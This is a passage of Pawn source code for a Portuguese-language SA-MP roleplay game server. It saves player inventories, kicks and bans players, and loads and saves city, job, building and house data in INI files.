    DOF2_SetInt(ficheiro, "o_19027", pObjects[playerid][o_19027]);
    DOF2_SetInt(ficheiro, "o_19007", pObjects[playerid][o_19007]);
    DOF2_SetInt(ficheiro, "o_19008", pObjects[playerid][o_19008]);
    DOF2_SetInt(ficheiro, "o_19009", pObjects[playerid][o_19009]);
    DOF2_SetInt(ficheiro, "o_19010", pObjects[playerid][o_19010]);
    DOF2_SetInt(ficheiro, "o_19010", pObjects[playerid][o_19010]);
    DOF2_SetInt(ficheiro, "o_19011", pObjects[playerid][o_19011]);
    DOF2_SetInt(ficheiro, "o_19012", pObjects[playerid][o_19012]);
    DOF2_SetInt(ficheiro, "o_19013", pObjects[playerid][o_19013]);
    DOF2_SetInt(ficheiro, "o_19014", pObjects[playerid][o_19014]);
    DOF2_SetInt(ficheiro, "o_19015", pObjects[playerid][o_19015]);
    DOF2_SetInt(ficheiro, "o_19016", pObjects[playerid][o_19016]);
    DOF2_SetInt(ficheiro, "o_19017", pObjects[playerid][o_19017]);
    DOF2_SetInt(ficheiro, "o_19018", pObjects[playerid][o_19018]);
    DOF2_SetInt(ficheiro, "Radio", pObjects[playerid][Radio]);
    DOF2_SetInt(ficheiro, "Arma1Mochila", pObjects[playerid][Arma1Mochila]);
    DOF2_SetInt(ficheiro, "Ammo1Mochila", pObjects[playerid][Ammo1Mochila]);
    DOF2_SetInt(ficheiro, "Arma2Mochila", pObjects[playerid][Arma2Mochila]);
    DOF2_SetInt(ficheiro, "Ammo2Mochila", pObjects[playerid][Ammo2Mochila]);
    DOF2_SetInt(ficheiro, "Arma3Mochila", pObjects[playerid][Arma3Mochila]);
    DOF2_SetInt(ficheiro, "Ammo3Mochila", pObjects[playerid][Ammo3Mochila]);
    DOF2_SetInt(ficheiro, "Arma4Mochila", pObjects[playerid][Arma4Mochila]);
    DOF2_SetInt(ficheiro, "Ammo4Mochila", pObjects[playerid][Ammo4Mochila]);
    DOF2_SetInt(ficheiro, "Bidom", pObjects[playerid][Bidom]);
    DOF2_SetInt(ficheiro, "ListaTel", pObjects[playerid][ListaTel]);
    DOF2_SetInt(ficheiro, "Mascara", pObjects[playerid][Mascara]);
    DOF2_SetInt(ficheiro, "Corda", pObjects[playerid][Corda]);
    DOF2_SetInt(ficheiro, "Venda", pObjects[playerid][Venda]);
    DOF2_SetInt(ficheiro, "Capacete", pObjects[playerid][Capacete]);
    DOF2_SetInt(ficheiro, "CanaDePesca", pObjects[playerid][CanaDePesca]);
    DOF2_SetInt(ficheiro, "WalkieTalkie", pObjects[playerid][WalkieTalkie]);
    DOF2_SetInt(ficheiro, "WalkieTalkieFreq", pObjects[playerid][WalkieTalkieFreq]);
    DOF2_SetInt(ficheiro, "Peixe_Corvina", pObjects[playerid][Peixe_Corvina]);
    DOF2_SetInt(ficheiro, "Peixe_Congro", pObjects[playerid][Peixe_Congro]);
    DOF2_SetInt(ficheiro, "Peixe_Robalo", pObjects[playerid][Peixe_Robalo]);
    DOF2_SetInt(ficheiro, "Peixe_Sargo", pObjects[playerid][Peixe_Sargo]);
    DOF2_SetInt(ficheiro, "Peixe_Goraz", pObjects[playerid][Peixe_Goraz]);
    DOF2_SetInt(ficheiro, "Peixe_Cavala", pObjects[playerid][Peixe_Cavala]);
    DOF2_SetInt(ficheiro, "Peixe_Dourada", pObjects[playerid][Peixe_Dourada]);
    DOF2_SetInt(ficheiro, "Peixe_Espada", pObjects[playerid][Peixe_Espada]);
    DOF2_SetInt(ficheiro, "Isco", pObjects[playerid][Isco]);

    DOF2_SaveFile();

	return 1;
}

public KickPlayer(playerid, kickedby[MAX_PLAYER_NAME], reason[])
{
	new string[256];

	format(string,sizeof(string),"%s kickou %s. Razão: %s", kickedby, GetPlayerNameEx(playerid), reason);
	SendClientMessageToAll(COLOR_CHAT, string);
	
 	AntiSpamAC[playerid] = 1;
 	GuardarJogador(playerid);
 	
	KickLog(playerid, kickedby, reason);

	SetTimerEx("KickT", 50, false, "i", playerid);

	return 1;
}

public BanPlayer(playerid, kickedby[MAX_PLAYER_NAME], reason[])
{
	new string[256];

	format(string,sizeof(string),"%s baniu o jogador %s. Razão: %s", kickedby, GetPlayerNameEx(playerid), reason);
	SendClientMessageToAll(COLOR_CHAT, string);
	
	pInfo[playerid][Banido] = 1;
	GuardarJogador(playerid);
	
	BanLog(playerid, kickedby, reason);

	SetTimerEx("KickT", 50, false, "i", playerid);

	return 1;
}

public BanPlayerIP(playerid, kickedby[MAX_PLAYER_NAME], reason[])
{
	new string[256];

	format(string,sizeof(string),"%s baniu o jogador %s. Razão: %s", kickedby, GetPlayerNameEx(playerid), reason);
	SendClientMessageToAll(COLOR_CHAT, string);
	
	Ban(playerid);
	
	new szCmd[64], pIp[16];
	GetPlayerIp(playerid, pIp, sizeof(pIp));
	format(szCmd, sizeof(szCmd), "banip %s", pIp);
	
	SendRconCommand(szCmd);
	pInfo[playerid][Banido] = 1;
	GuardarJogador(playerid);

	BanLog(playerid, kickedby, reason);

	return 1;
}

public CarregarCidades()
{
	new ficheiro[64];
	
	new tick1;
	new tick2;

	tick1 = GetTickCount();
	
	for(new i = 0; i < MAX_CIDADES; i++)
	{
		format(ficheiro, sizeof(ficheiro), "PCRP/Cidades/%d.ini", i);
		
 		if(!DOF2_FileExists(ficheiro))
 		{
 		    DOF2_CreateFile(ficheiro);
 		    
 		    DOF2_SetString(ficheiro, "Nome", "Unused");
       		DOF2_SetFloat(ficheiro, "X", 0);
       		DOF2_SetFloat(ficheiro, "Y", 0);
       		DOF2_SetFloat(ficheiro, "Z", 0);
       		DOF2_SetFloat(ficheiro, "A", 0);
       		DOF2_SetInt(ficheiro, "Interior", 0);
       		DOF2_SetInt(ficheiro, "VirtualWorld", 0);
       		
       		DOF2_SaveFile();
 		}
 		else
 		{
 		    format(SpawnInfo[i][Nome], 32, "%s", DOF2_GetString(ficheiro, "Nome"));
 		    SpawnInfo[i][X] = DOF2_GetFloat(ficheiro, "X");
 		    SpawnInfo[i][Z] = DOF2_GetFloat(ficheiro, "Z");
 		    SpawnInfo[i][Y] = DOF2_GetFloat(ficheiro, "Y");
 		    SpawnInfo[i][A] = DOF2_GetFloat(ficheiro, "A");
 		    SpawnInfo[i][Interior] = DOF2_GetInt(ficheiro, "Interior");
 		    SpawnInfo[i][VirtualWorld] = DOF2_GetInt(ficheiro, "VirtualWorld");
 		}
	}
	
	tick2 = GetTickCount();
	
	printf("\n [PC:RP] Cidades carregadas (%d ms)", tick2-tick1);
	return 1;
}

public GuardarCidades()
{
	new ficheiro[64];
	
	for(new i = 0; i < MAX_CIDADES; i++)
	{
		format(ficheiro, sizeof(ficheiro), "PCRP/Cidades/%d.ini", i);
		
		DOF2_SetString(ficheiro, "Nome", SpawnInfo[i][Nome]);
		DOF2_SetFloat(ficheiro, "X", SpawnInfo[i][X]);
		DOF2_SetFloat(ficheiro, "Y", SpawnInfo[i][Y]);
		DOF2_SetFloat(ficheiro, "Z", SpawnInfo[i][Z]);
		DOF2_SetFloat(ficheiro, "A", SpawnInfo[i][A]);
		DOF2_SetInt(ficheiro, "Interior", SpawnInfo[i][Interior]);
		DOF2_SetInt(ficheiro, "VirtualWorld", SpawnInfo[i][VirtualWorld]);

		DOF2_SaveFile();
	}

	return 1;
}

public GuardarCidade(id)
{
	new ficheiro[64];
	new i = id;

	format(ficheiro, sizeof(ficheiro), "PCRP/Cidades/%d.ini", i);

	DOF2_SetFloat(ficheiro, "X", SpawnInfo[i][X]);
	DOF2_SetFloat(ficheiro, "Y", SpawnInfo[i][Y]);
	DOF2_SetFloat(ficheiro, "Z", SpawnInfo[i][Z]);
	DOF2_SetFloat(ficheiro, "A", SpawnInfo[i][A]);
	DOF2_SetInt(ficheiro, "Interior", SpawnInfo[i][Interior]);
	DOF2_SetInt(ficheiro, "VirtualWorld", SpawnInfo[i][VirtualWorld]);

	DOF2_SaveFile();

	return 1;
}

public CarregarJobs()
{
	new ficheiro[64];
	new tick1;
	new tick2;

	tick1 = GetTickCount();

	for(new i = 0; i < MAX_JOBS; i++)
	{
	    if(i == 0) continue;
		format(ficheiro, sizeof(ficheiro), "PCRP/Jobs/%d.ini", i);

 		if(!DOF2_FileExists(ficheiro))
 		{
 		    DOF2_CreateFile(ficheiro);

            DOF2_SetInt(ficheiro, "ID", i);
       		DOF2_SetString(ficheiro, "Nome", "Unused");
       		DOF2_SetInt(ficheiro, "Salario", 0);
       		DOF2_SetInt(ficheiro, "RotaSalario", 0);
       		DOF2_SetInt(ficheiro, "Ligeiros", 0);
       		DOF2_SetInt(ficheiro, "Pesados", 0);
       		DOF2_SetInt(ficheiro, "Motociclos", 0);
       		DOF2_SetInt(ficheiro, "Barco", 0);

       		DOF2_SaveFile();
 		}
 		else
 		{
 		    jInfo[i][ID] = i;
 		    format(jInfo[i][Nome], 32, "%s", DOF2_GetString(ficheiro, "Nome"));
 		    jInfo[i][Salario] = DOF2_GetInt(ficheiro, "Salario");
 		    jInfo[i][RotaSalario] = DOF2_GetInt(ficheiro, "RotaSalario");
 		    jInfo[i][Ligeiros] = DOF2_GetInt(ficheiro, "Ligeiros");
 		    jInfo[i][Pesados] = DOF2_GetInt(ficheiro, "Pesados");
 		    jInfo[i][Motociclos] = DOF2_GetInt(ficheiro, "Motociclos");
 		    jInfo[i][Barco] = DOF2_GetInt(ficheiro, "Barco");
 		}
	}
	
	tick2 = GetTickCount();
	printf("\n [PC:RP] Jobs carregados (%d ms)", tick2-tick1);
	
	return 1;
}

public GuardarJobs()
{
	new ficheiro[64];

	for(new i = 0; i < MAX_JOBS; i++)
	{
	    if(i == 0) continue;
		format(ficheiro, sizeof(ficheiro), "PCRP/Jobs/%d.ini", i);

        DOF2_SetInt(ficheiro, "ID", i);
		DOF2_SetString(ficheiro, "Nome", jInfo[i][Nome]);
		DOF2_SetInt(ficheiro, "Salario", jInfo[i][Salario]);
		DOF2_SetInt(ficheiro, "RotaSalario", jInfo[i][RotaSalario]);
		DOF2_SetInt(ficheiro, "Ligeiros", jInfo[i][Ligeiros]);
		DOF2_SetInt(ficheiro, "Pesados", jInfo[i][Pesados]);
		DOF2_SetInt(ficheiro, "Motociclos", jInfo[i][Motociclos]);
		DOF2_SetInt(ficheiro, "Barco", jInfo[i][Barco]);

		DOF2_SaveFile();
	}

	return 1;
}

public GuardarJob(id)
{
	new ficheiro[64];
	new i = id;
	
	format(ficheiro, sizeof(ficheiro), "PCRP/Jobs/%d.ini", i);

	DOF2_SetInt(ficheiro, "ID", i);
	DOF2_SetString(ficheiro, "Nome", jInfo[i][Nome]);
	DOF2_SetInt(ficheiro, "Salario", jInfo[i][Salario]);
	DOF2_SetInt(ficheiro, "RotaSalario", jInfo[i][RotaSalario]);
	DOF2_SetInt(ficheiro, "Ligeiros", jInfo[i][Ligeiros]);
	DOF2_SetInt(ficheiro, "Pesados", jInfo[i][Pesados]);
	DOF2_SetInt(ficheiro, "Motociclos", jInfo[i][Motociclos]);
	DOF2_SetInt(ficheiro, "Barco", jInfo[i][Barco]);

	DOF2_SaveFile();

	return 1;
}

public CarregarBuildings()
{
	new ficheiro[64];
	new tick1;
	new tick2;

	tick1 = GetTickCount();

	for(new i = 0; i < MAX_BUILDINGS; i++)
	{
	    if(i == 0) continue;

    	format(ficheiro, sizeof(ficheiro), "PCRP/Buildings/%d.ini", i);
    	if(!DOF2_FileExists(ficheiro))
  		{
	  		DOF2_CreateFile(ficheiro);

            DOF2_SetInt(ficheiro, "ID", i);
            DOF2_SetString(ficheiro, "Nome", "Unused");
  			DOF2_SetFloat(ficheiro, "EnterX", 0);
  			DOF2_SetFloat(ficheiro, "EnterY", 0);
  			DOF2_SetFloat(ficheiro, "EnterZ", 0);
  			DOF2_SetFloat(ficheiro, "EnterAngle", 0);
  			DOF2_SetInt(ficheiro, "EnterInterior", 0);
  			DOF2_SetInt(ficheiro, "EnterVirtualWorld", 0);
            DOF2_SetFloat(ficheiro, "ExitX", 0);
            DOF2_SetFloat(ficheiro, "ExitY", 0);
            DOF2_SetFloat(ficheiro, "ExitZ", 0);
            DOF2_SetFloat(ficheiro, "ExitAngle", 0);
  			DOF2_SetInt(ficheiro, "Interior", 0);
  			DOF2_SetInt(ficheiro, "VirtualWorld", i);
            DOF2_SetInt(ficheiro, "PickupID", 1559);
            DOF2_SetInt(ficheiro, "Locked", 1);

    		DOF2_SaveFile();
   		}
   		else
   		{
   		    buInfo[i][ID] = DOF2_GetInt(ficheiro, "ID");
   		    format(buInfo[i][Nome], 32, "%s", DOF2_GetString(ficheiro, "Nome"));
   		    buInfo[i][EnterX] = DOF2_GetFloat(ficheiro, "EnterX");
   		    buInfo[i][EnterY] = DOF2_GetFloat(ficheiro, "EnterY");
   		    buInfo[i][EnterZ] = DOF2_GetFloat(ficheiro, "EnterZ");
   		    buInfo[i][EnterAngle] = DOF2_GetFloat(ficheiro, "EnterAngle");
   		    buInfo[i][EnterInterior] = DOF2_GetInt(ficheiro, "EnterInterior");
   		    buInfo[i][EnterVirtualWorld] = DOF2_GetInt(ficheiro, "EnterVirtualWorld");
   		    buInfo[i][ExitX] = DOF2_GetFloat(ficheiro, "ExitX");
   		    buInfo[i][ExitY] = DOF2_GetFloat(ficheiro, "ExitY");
   		    buInfo[i][ExitZ] = DOF2_GetFloat(ficheiro, "ExitZ");
   		    buInfo[i][ExitAngle] = DOF2_GetFloat(ficheiro, "ExitAngle");
   		    buInfo[i][Interior] = DOF2_GetInt(ficheiro, "Interior");
   		    buInfo[i][VirtualWorld] = DOF2_GetInt(ficheiro, "VirtualWorld");
   		    buInfo[i][PickupID] = DOF2_GetInt(ficheiro, "PickupID");
   		    buInfo[i][Locked] = DOF2_GetInt(ficheiro, "Locked");
		}
		AtualizarBuilding(i);
	}
	
	tick2 = GetTickCount();
	printf("\n [PC:RP] Buildings carregados (%d ms)", tick2-tick1);

	return 1;
}

public GuardarBuildings()
{
	new ficheiro[64];
	for(new i = 0; i < MAX_BUILDINGS; i++)
	{
	    if(i == 0) continue;
	    format(ficheiro, sizeof(ficheiro), "PCRP/Buildings/%d.ini", i);

		DOF2_SetInt(ficheiro, "ID", i);
		DOF2_SetString(ficheiro, "Nome", buInfo[i][Nome]);
		DOF2_SetFloat(ficheiro, "EnterX", buInfo[i][EnterX]);
		DOF2_SetFloat(ficheiro, "EnterY", buInfo[i][EnterY]);
		DOF2_SetFloat(ficheiro, "EnterZ", buInfo[i][EnterZ]);
		DOF2_SetFloat(ficheiro, "EnterAngle", buInfo[i][EnterAngle]);
		DOF2_SetInt(ficheiro, "EnterInterior", buInfo[i][EnterInterior]);
		DOF2_SetInt(ficheiro, "EnterVirtualWorld", buInfo[i][EnterVirtualWorld]);
		DOF2_SetFloat(ficheiro, "ExitX", buInfo[i][ExitX]);
		DOF2_SetFloat(ficheiro, "ExitY", buInfo[i][ExitY]);
		DOF2_SetFloat(ficheiro, "ExitZ", buInfo[i][ExitZ]);
		DOF2_SetFloat(ficheiro, "ExitAngle", buInfo[i][ExitAngle]);
		DOF2_SetInt(ficheiro, "Interior", buInfo[i][Interior]);
		DOF2_SetInt(ficheiro, "VirtualWorld", i);
		DOF2_SetInt(ficheiro, "PickupID", buInfo[i][PickupID]);
		DOF2_SetInt(ficheiro, "Locked", buInfo[i][Locked]);

		DOF2_SaveFile();

	}
	return 1;
}

public GuardarBuilding(id)
{
	new i = id;
	new ficheiro[64];

	format(ficheiro, sizeof(ficheiro), "PCRP/Buildings/%d.ini", i);

	DOF2_SetInt(ficheiro, "ID", i);
	DOF2_SetString(ficheiro, "Nome", buInfo[i][Nome]);
	DOF2_SetFloat(ficheiro, "EnterX", buInfo[i][EnterX]);
	DOF2_SetFloat(ficheiro, "EnterY", buInfo[i][EnterY]);
	DOF2_SetFloat(ficheiro, "EnterZ", buInfo[i][EnterZ]);
	DOF2_SetFloat(ficheiro, "EnterAngle", buInfo[i][EnterAngle]);
	DOF2_SetInt(ficheiro, "EnterInterior", buInfo[i][EnterInterior]);
	DOF2_SetInt(ficheiro, "EnterVirtualWorld", buInfo[i][EnterVirtualWorld]);
	DOF2_SetFloat(ficheiro, "ExitX", buInfo[i][ExitX]);
	DOF2_SetFloat(ficheiro, "ExitY", buInfo[i][ExitY]);
	DOF2_SetFloat(ficheiro, "ExitZ", buInfo[i][ExitZ]);
	DOF2_SetFloat(ficheiro, "ExitAngle", buInfo[i][ExitAngle]);
	DOF2_SetInt(ficheiro, "Interior", buInfo[i][Interior]);
	DOF2_SetInt(ficheiro, "VirtualWorld", i);
	DOF2_SetInt(ficheiro, "PickupID", buInfo[i][PickupID]);
	DOF2_SetInt(ficheiro, "Locked", buInfo[i][Locked]);

	DOF2_SaveFile();

	AtualizarBuilding(id);

	return 1;
}

public AtualizarBuilding(id)
{
	new string[128];
	new label[512];

 	DestroyDynamicPickup(BuildingPickup[id]);
  	DestroyDynamic3DTextLabel(BuildingLabel[id]);

	format(string, sizeof(string), "{00FF00}[ {FF0000}%s {00FF00}]", buInfo[id][Nome]); strcat(label, string);
	format(string, sizeof(string), "\n{00FF00}ID: {FF0000}%d", id); strcat(label, string);

	BuildingPickup[id] = CreateDynamicPickup(buInfo[id][PickupID], 1, buInfo[id][EnterX], buInfo[id][EnterY], buInfo[id][EnterZ]+0.6, -1, -1, -1, 100.0);
	BuildingLabel[id] = CreateDynamic3DTextLabel(label, COLOR_WHITE, buInfo[id][EnterX], buInfo[id][EnterY], buInfo[id][EnterZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
	
	return 1;
}

public CarregarCasas()
{
	new ficheiro[64];
	new tick1;
	new tick2;

	tick1 = GetTickCount();

	for(new i = 0; i < MAX_CASAS; i++)
	{
	    if(i == 0) continue;

    	format(ficheiro, sizeof(ficheiro), "PCRP/Casas/%d.ini", i);
    	if(!DOF2_FileExists(ficheiro))
  		{
	  		DOF2_CreateFile(ficheiro);

            DOF2_SetInt(ficheiro, "ID", i);
            DOF2_SetString(ficheiro, "Nome", "Unused");
            DOF2_SetString(ficheiro, "Owner", "Ninguém");
            DOF2_SetFloat(ficheiro, "Comprada", 0);
  			DOF2_SetFloat(ficheiro, "EnterX", 0);
  			DOF2_SetFloat(ficheiro, "EnterY", 0);
  			DOF2_SetFloat(ficheiro, "EnterZ", 0);
  			DOF2_SetFloat(ficheiro, "EnterAngle", 0);
  			DOF2_SetInt(ficheiro, "EnterInterior", 0);
  			DOF2_SetInt(ficheiro, "EnterVirtualWorld", 0);
            DOF2_SetFloat(ficheiro, "ExitX", 0);
            DOF2_SetFloat(ficheiro, "ExitY", 0);
            DOF2_SetFloat(ficheiro, "ExitZ", 0);
            DOF2_SetFloat(ficheiro, "ExitAngle", 0);
  			DOF2_SetInt(ficheiro, "Interior", 0);
  			DOF2_SetInt(ficheiro, "VirtualWorld", i);
            DOF2_SetInt(ficheiro, "PickupID", 1273);
            DOF2_SetInt(ficheiro, "Locked", 1);
            DOF2_SetInt(ficheiro, "Price", 0);
            DOF2_SetInt(ficheiro, "Bank", 0);
            DOF2_SetInt(ficheiro, "AluguerStatus", 0);
            DOF2_SetInt(ficheiro, "Aluguer", 0);
            DOF2_SetInt(ficheiro, "Arma1", 0);
            DOF2_SetInt(ficheiro, "Ammo1", 0);
            DOF2_SetInt(ficheiro, "Arma2", 0);
            DOF2_SetInt(ficheiro, "Ammo2", 0);
            DOF2_SetInt(ficheiro, "Arma3", 0);
            DOF2_SetInt(ficheiro, "Ammo3", 0);
            DOF2_SetInt(ficheiro, "IsCaravana", 0);
            DOF2_SetInt(ficheiro, "CarroCaravanaID", 0);
  			DOF2_SetFloat(ficheiro, "GaragemEnterX", 0);
  			DOF2_SetFloat(ficheiro, "GaragemEnterY", 0);
  			DOF2_SetFloat(ficheiro, "GaragemEnterZ", 0);
  			DOF2_SetInt(ficheiro, "GaragemEnterInterior", 0);
  			DOF2_SetInt(ficheiro, "GaragemEnterVirtualWorld", 0);
            DOF2_SetFloat(ficheiro, "GaragemExitX", 0);
            DOF2_SetFloat(ficheiro, "GaragemExitY", 0);
            DOF2_SetFloat(ficheiro, "GaragemExitZ", 0);
            DOF2_SetFloat(ficheiro, "GaragemExitAngle", 0);
  			DOF2_SetInt(ficheiro, "GaragemVirtualWorld", 0);
  			DOF2_SetInt(ficheiro, "GaragemPickupID", 2485);
            DOF2_SetInt(ficheiro, "GaragemLocked", 1);

    		DOF2_SaveFile();
   		}
   		else
   		{
   		    hInfo[i][ID] = DOF2_GetInt(ficheiro, "ID");
   		    format(hInfo[i][Nome], 32, "%s", DOF2_GetString(ficheiro, "Nome"));
   		    format(hInfo[i][Owner], 32, "%s", DOF2_GetString(ficheiro, "Owner"));
   		    hInfo[i][Comprada] = DOF2_GetInt(ficheiro, "Comprada");
   		    hInfo[i][EnterX] = DOF2_GetFloat(ficheiro, "EnterX");
   		    hInfo[i][EnterY] = DOF2_GetFloat(ficheiro, "EnterY");
   		    hInfo[i][EnterZ] = DOF2_GetFloat(ficheiro, "EnterZ");
   		    hInfo[i][EnterAngle] = DOF2_GetFloat(ficheiro, "EnterAngle");
   		    hInfo[i][EnterInterior] = DOF2_GetInt(ficheiro, "EnterInterior");
   		    hInfo[i][EnterVirtualWorld] = DOF2_GetInt(ficheiro, "EnterVirtualWorld");
   		    hInfo[i][ExitX] = DOF2_GetFloat(ficheiro, "ExitX");
   		    hInfo[i][ExitY] = DOF2_GetFloat(ficheiro, "ExitY");
   		    hInfo[i][ExitZ] = DOF2_GetFloat(ficheiro, "ExitZ");
   		    hInfo[i][ExitAngle] = DOF2_GetFloat(ficheiro, "ExitAngle");
   		    hInfo[i][Interior] = DOF2_GetInt(ficheiro, "Interior");
   		    hInfo[i][VirtualWorld] = DOF2_GetInt(ficheiro, "VirtualWorld");
   		    hInfo[i][PickupID] = DOF2_GetInt(ficheiro, "PickupID");
   		    hInfo[i][Locked] = DOF2_GetInt(ficheiro, "Locked");
   		    hInfo[i][Price] = DOF2_GetInt(ficheiro, "Price");
   		    hInfo[i][Bank] = DOF2_GetInt(ficheiro, "Bank");
   		    hInfo[i][AluguerStatus] = DOF2_GetInt(ficheiro, "AluguerStatus");
   		    hInfo[i][Aluguer] = DOF2_GetInt(ficheiro, "Aluguer");
   		    hInfo[i][Arma1] = DOF2_GetInt(ficheiro, "Arma1");
   		    hInfo[i][Ammo1] = DOF2_GetInt(ficheiro, "Ammo1");
   		    hInfo[i][Arma2] = DOF2_GetInt(ficheiro, "Arma2");
   		    hInfo[i][Ammo2] = DOF2_GetInt(ficheiro, "Ammo2");
   		    hInfo[i][Arma3] = DOF2_GetInt(ficheiro, "Arma3");
   		    hInfo[i][Ammo3] = DOF2_GetInt(ficheiro, "Ammo3");
   		    hInfo[i][IsCaravana] = DOF2_GetInt(ficheiro, "IsCaravana");
   		    hInfo[i][CarroCaravanaID] = DOF2_GetInt(ficheiro, "CarroCaravanaID");
   		    hInfo[i][GaragemEnterX] = DOF2_GetFloat(ficheiro, "GaragemEnterX");
   		    hInfo[i][GaragemEnterY] = DOF2_GetFloat(ficheiro, "GaragemEnterY");
   		    hInfo[i][GaragemEnterZ] = DOF2_GetFloat(ficheiro, "GaragemEnterZ");
   		    hInfo[i][GaragemEnterInterior] = DOF2_GetInt(ficheiro, "GaragemEnterInterior");
   		    hInfo[i][GaragemEnterVirtualWorld] = DOF2_GetInt(ficheiro, "GaragemEnterVirtualWorld");
   		    hInfo[i][GaragemExitX] = DOF2_GetFloat(ficheiro, "GaragemExitX");
   		    hInfo[i][GaragemExitY] = DOF2_GetFloat(ficheiro, "GaragemExitY");
   		    hInfo[i][GaragemExitZ] = DOF2_GetFloat(ficheiro, "GaragemExitZ");
   		    hInfo[i][GaragemEnterVirtualWorld] = DOF2_GetInt(ficheiro, "GaragemEnterVirtualWorld");
   		    hInfo[i][GaragemPickupID] = DOF2_GetInt(ficheiro, "GaragemPickupID");
   		    hInfo[i][GaragemLocked] = DOF2_GetInt(ficheiro, "GaragemLocked");
		}
		AtualizarCasa(i);
	}
	
	tick2 = GetTickCount();
	printf("\n [PC:RP] Casas carregadas (%d ms)", tick2-tick1);
	
	return 1;
}

public GuardarCasas()
{
	new ficheiro[64];
	for(new i = 0; i < MAX_CASAS; i++)
	{
	    if(i == 0) continue;
	    format(ficheiro, sizeof(ficheiro), "PCRP/Casas/%d.ini", i);

		DOF2_SetInt(ficheiro, "ID", i);
		DOF2_SetString(ficheiro, "Nome", hInfo[i][Nome]);
		DOF2_SetString(ficheiro, "Owner", hInfo[i][Owner]);
		DOF2_SetFloat(ficheiro, "Comprada", hInfo[i][Comprada]);
		DOF2_SetFloat(ficheiro, "EnterX", hInfo[i][EnterX]);
		DOF2_SetFloat(ficheiro, "EnterY", hInfo[i][EnterY]);
		DOF2_SetFloat(ficheiro, "EnterZ", hInfo[i][EnterZ]);
		DOF2_SetFloat(ficheiro, "EnterAngle", hInfo[i][EnterAngle]);
		DOF2_SetInt(ficheiro, "EnterInterior", hInfo[i][EnterInterior]);
		DOF2_SetInt(ficheiro, "EnterVirtualWorld", hInfo[i][EnterVirtualWorld]);
		DOF2_SetFloat(ficheiro, "ExitX", hInfo[i][ExitX]);
		DOF2_SetFloat(ficheiro, "ExitY", hInfo[i][ExitY]);
		DOF2_SetFloat(ficheiro, "ExitZ", hInfo[i][ExitZ]);
		DOF2_SetFloat(ficheiro, "ExitAngle", hInfo[i][ExitAngle]);
		DOF2_SetInt(ficheiro, "Interior", hInfo[i][Interior]);
		DOF2_SetInt(ficheiro, "VirtualWorld", i);
		DOF2_SetInt(ficheiro, "PickupID", hInfo[i][PickupID]);
		DOF2_SetInt(ficheiro, "Locked", hInfo[i][Locked]);
		DOF2_SetInt(ficheiro, "Price", hInfo[i][Price]);
		DOF2_SetInt(ficheiro, "Bank", hInfo[i][Bank]);
		DOF2_SetInt(ficheiro, "AluguerStatus", hInfo[i][AluguerStatus]);
		DOF2_SetInt(ficheiro, "Aluguer", hInfo[i][Aluguer]);
		DOF2_SetInt(ficheiro, "Arma1", hInfo[i][Arma1]);
		DOF2_SetInt(ficheiro, "Ammo1", hInfo[i][Ammo1]);
		DOF2_SetInt(ficheiro, "Arma2", hInfo[i][Arma2]);
		DOF2_SetInt(ficheiro, "Ammo2", hInfo[i][Ammo2]);
		DOF2_SetInt(ficheiro, "Arma3", hInfo[i][Arma3]);
		DOF2_SetInt(ficheiro, "Ammo3", hInfo[i][Ammo3]);
		DOF2_SetInt(ficheiro, "IsCaravana", hInfo[i][IsCaravana]);
		DOF2_SetInt(ficheiro, "CarroCaravanaID", hInfo[i][CarroCaravanaID]);
		DOF2_SetFloat(ficheiro, "GaragemEnterX", hInfo[i][GaragemEnterX]);
		DOF2_SetFloat(ficheiro, "GaragemEnterY", hInfo[i][GaragemEnterY]);
		DOF2_SetFloat(ficheiro, "GaragemEnterZ", hInfo[i][GaragemEnterZ]);
		DOF2_SetInt(ficheiro, "GaragemEnterInterior", hInfo[i][GaragemEnterInterior]);
		DOF2_SetInt(ficheiro, "GaragemEnterVirtualWorld", hInfo[i][GaragemEnterVirtualWorld]);
  		DOF2_SetFloat(ficheiro, "GaragemExitX", hInfo[i][GaragemExitX]);
  		DOF2_SetFloat(ficheiro, "GaragemExitY", hInfo[i][GaragemExitY]);
	 	DOF2_SetFloat(ficheiro, "GaragemExitZ", hInfo[i][GaragemExitZ]);
  		DOF2_SetFloat(ficheiro, "GaragemExitAngle", hInfo[i][GaragemExitAngle]);
		DOF2_SetInt(ficheiro, "GaragemVirtualWorld", hInfo[i][GaragemVirtualWorld]);
		DOF2_SetInt(ficheiro, "GaragemPickupID", hInfo[i][GaragemPickupID]);
  		DOF2_SetInt(ficheiro, "GaragemLocked", hInfo[i][GaragemLocked]);

		DOF2_SaveFile();

	}
	return 1;
}

public GuardarCasa(id)
{
	new i = id;
	new ficheiro[64];

	format(ficheiro, sizeof(ficheiro), "PCRP/Casas/%d.ini", i);

	DOF2_SetInt(ficheiro, "ID", i);
	DOF2_SetString(ficheiro, "Nome", hInfo[i][Nome]);
	DOF2_SetString(ficheiro, "Owner", hInfo[i][Owner]);
	DOF2_SetFloat(ficheiro, "Comprada", hInfo[i][Comprada]);
	DOF2_SetFloat(ficheiro, "EnterX", hInfo[i][EnterX]);
	DOF2_SetFloat(ficheiro, "EnterY", hInfo[i][EnterY]);
	DOF2_SetFloat(ficheiro, "EnterZ", hInfo[i][EnterZ]);
	DOF2_SetFloat(ficheiro, "EnterAngle", hInfo[i][EnterAngle]);
	DOF2_SetInt(ficheiro, "EnterInterior", hInfo[i][EnterInterior]);
	DOF2_SetInt(ficheiro, "EnterVirtualWorld", hInfo[i][EnterVirtualWorld]);
	DOF2_SetFloat(ficheiro, "ExitX", hInfo[i][ExitX]);
	DOF2_SetFloat(ficheiro, "ExitY", hInfo[i][ExitY]);
	DOF2_SetFloat(ficheiro, "ExitZ", hInfo[i][ExitZ]);
	DOF2_SetFloat(ficheiro, "ExitAngle", hInfo[i][ExitAngle]);
	DOF2_SetInt(ficheiro, "Interior", hInfo[i][Interior]);
	DOF2_SetInt(ficheiro, "VirtualWorld", i);
	DOF2_SetInt(ficheiro, "PickupID", hInfo[i][PickupID]);
	DOF2_SetInt(ficheiro, "Locked", hInfo[i][Locked]);
	DOF2_SetInt(ficheiro, "Price", hInfo[i][Price]);
	DOF2_SetInt(ficheiro, "Bank", hInfo[i][Bank]);
	DOF2_SetInt(ficheiro, "AluguerStatus", hInfo[i][AluguerStatus]);
	DOF2_SetInt(ficheiro, "Aluguer", hInfo[i][Aluguer]);
	DOF2_SetInt(ficheiro, "Arma1", hInfo[i][Arma1]);
	DOF2_SetInt(ficheiro, "Ammo1", hInfo[i][Ammo1]);
	DOF2_SetInt(ficheiro, "Arma2", hInfo[i][Arma2]);
